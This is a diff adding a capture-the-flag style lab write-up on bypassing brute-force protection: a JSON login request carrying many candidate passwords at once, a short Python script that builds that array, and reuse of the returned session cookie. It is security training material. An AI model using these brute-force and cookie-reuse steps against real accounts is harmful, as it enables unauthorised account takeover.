@@ -302,8 +302,38 @@ Solution:
 3) So we need to change the last request when we enter wrong password to repeater and then to the intruder and change username to carlos and add the password given as simple list.
 4) In the intruder result when we get different length we get correct password try login with that username and password.
 
-								
+******************************************************
 
+								
+									AUTH -LAB013:
+						    Broken brute-force protection, multiple credentials per request
+						    
+ This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.
+
+    Victim's username: carlos
+    Candidate passwords
+
+Solution:
+
+1) First we need to login using carlos username and random password and send the request to the repeater.
+2) So the request is in JSON format which takes the input in set format.
+3) So it takes more than one passwords at a time, we need to write python script for all passwords to be in the line.
+
+PYTHON SCRIPT:
+
+print("[", end = '')
+
+with open('password.txt', 'r') as f:
+    lines = f.readlines()
+
+for pwd in lines:
+    print('"' + pwd.rstrip("\n") + '",', end = '')
+
+print('"random"]', end = '')
+
+4) Copy all passwords from vscode terminal and paste them in the burpsuite repeater.
+5) send the request using repeater and then follow redirection.
+6) copy the session-id and open browser inspect it, go to storage or application and paste the session id in cookie section and the lab is solved.
 
 
 
